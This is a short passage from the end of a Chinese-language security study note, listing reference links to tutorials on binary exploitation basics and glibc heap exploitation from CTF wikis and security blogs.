 ```

## 参考链接

https://www.wangan.com/docs/pwn-base

https://wiki.x10sec.org/pwn/linux/glibc-heap/heap_overview-zh/ 

https://www.yuque.com/hxfqg9/bin/ape5up

https://www.bookstack.cn/read/CTF-All-In-One/doc-3.1.8_heap_exploit_3.md

https://www.freebuf.com/articles/system/209096.html

https://www.anquanke.com/post/id/176194#h2-3

https://zhuanlan.zhihu.com/p/213904612